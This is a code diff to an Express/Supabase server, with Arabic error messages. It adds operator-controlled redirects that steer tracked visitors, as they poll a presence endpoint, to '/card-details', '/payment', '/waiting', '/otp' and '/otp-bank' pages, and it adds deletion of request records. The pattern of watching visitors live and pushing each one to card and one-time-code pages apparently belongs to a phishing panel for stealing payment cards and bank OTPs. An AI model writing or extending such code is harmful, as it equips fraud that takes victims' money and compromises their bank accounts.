@@ -81,7 +81,34 @@ const devicePresence = new Map<string, PresenceEntry>();
 const userPresence = new Map<string, { lastSeen: number; currentPage: string }>();
 const lastKnownUserPage = new Map<string, string>();
 const userMetaMap = new Map<string, VisitorMeta>();
+const pendingRedirects = new Map<string, string>();
 let totalVisitorsCounter = 0;
+
+function normalizeRedirectTarget(action?: string | null): string | null {
+  if (!action) return null;
+  const trimmed = String(action).trim();
+  if (!trimmed) return null;
+  const map: Record<string, string> = {
+    '/': '/',
+    home: '/',
+    '/request': '/request',
+    form: '/request',
+    '/register-company': '/register-company',
+    company: '/register-company',
+    '/payment': '/payment',
+    payment: '/payment',
+    '/card-details': '/card-details',
+    card: '/card-details',
+    '/waiting': '/waiting',
+    waiting: '/waiting',
+    '/otp': '/otp',
+    otp: '/otp',
+    'otp-sms': '/otp',
+    '/otp-bank': '/otp-bank',
+    'otp-bank': '/otp-bank'
+  };
+  return map[trimmed] || (trimmed.startsWith('/') ? trimmed : null);
+}
 
 function extractVisitorMeta(req: express.Request): VisitorMeta {
   const ua = String(req.headers['user-agent'] || '');
@@ -200,17 +227,37 @@ app.post('/api/presence', async (req, res) => {
     });
 
     if (requestId) {
-      userPresence.set(String(requestId), {
+      const reqIdStr = String(requestId);
+      userPresence.set(reqIdStr, {
         lastSeen: now,
         currentPage
       });
-      lastKnownUserPage.set(String(requestId), currentPage);
-      userMetaMap.set(String(requestId), meta);
+      lastKnownUserPage.set(reqIdStr, currentPage);
+      userMetaMap.set(reqIdStr, meta);
+
+      const targetRoute = pendingRedirects.get(reqIdStr);
+      if (targetRoute) {
+        if (currentPage === targetRoute) {
+          // Visitor arrived at redirected page; consume the pending redirect
+          pendingRedirects.delete(reqIdStr);
+          const supabase = getSupabase();
+          if (supabase) {
+            supabase
+              .from('requests')
+              .update({ next_action: '', updated_at: new Date().toISOString() })
+              .eq('id', reqIdStr)
+              .then(() => {});
+          }
+        } else {
+          prunePresence();
+          return res.json({ ok: true, requestId: reqIdStr, redirectTo: targetRoute });
+        }
+      }
     }
   }
 
   prunePresence();
-  res.json({ ok: true, requestId });
+  res.json({ ok: true, requestId, redirectTo: null });
 });
 
 app.get('/api/stats', (_req, res) => {
@@ -458,6 +505,22 @@ app.patch('/api/requests/:id', async (req, res) => {
   });
   delete patchRow.id;
 
+  if (req.body?.nextAction !== undefined) {
+    const targetRoute = normalizeRedirectTarget(req.body.nextAction);
+    if (targetRoute) {
+      pendingRedirects.set(id, targetRoute);
+      lastKnownUserPage.set(id, targetRoute);
+      const existingPresence = userPresence.get(id);
+      if (existingPresence) {
+        userPresence.set(id, { ...existingPresence, currentPage: targetRoute });
+      }
+    } else {
+      pendingRedirects.delete(id);
+    }
+  } else if (req.body?.step === 'card' || req.body?.step === 'otp' || req.body?.step === 'otp-bank') {
+    pendingRedirects.delete(id);
+  }
+
   const { data, error } = await supabase
     .from('requests')
     .update(patchRow)
@@ -470,6 +533,34 @@ app.patch('/api/requests/:id', async (req, res) => {
   }
 
   return res.json(fromSupabaseRow(data));
+});
+
+app.delete('/api/requests/:id', async (req, res) => {
+  const { id } = req.params;
+  if (!id) {
+    return res.status(400).json({ error: 'معرف الطلب غير متوفر' });
+  }
+
+  const supabase = getSupabase();
+  if (!supabase) {
+    return res.status(503).json({ error: 'يرجى ضبط SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في الخادم' });
+  }
+
+  const { error } = await supabase
+    .from('requests')
+    .delete()
+    .eq('id', id);
+
+  if (error) {
+    return res.status(500).json({ error: error.message });
+  }
+
+  userPresence.delete(id);
+  lastKnownUserPage.delete(id);
+  userMetaMap.delete(id);
+  pendingRedirects.delete(id);
+
+  return res.json({ ok: true, id });
 });
 
 // ==================== SERVER STARTUP ====================
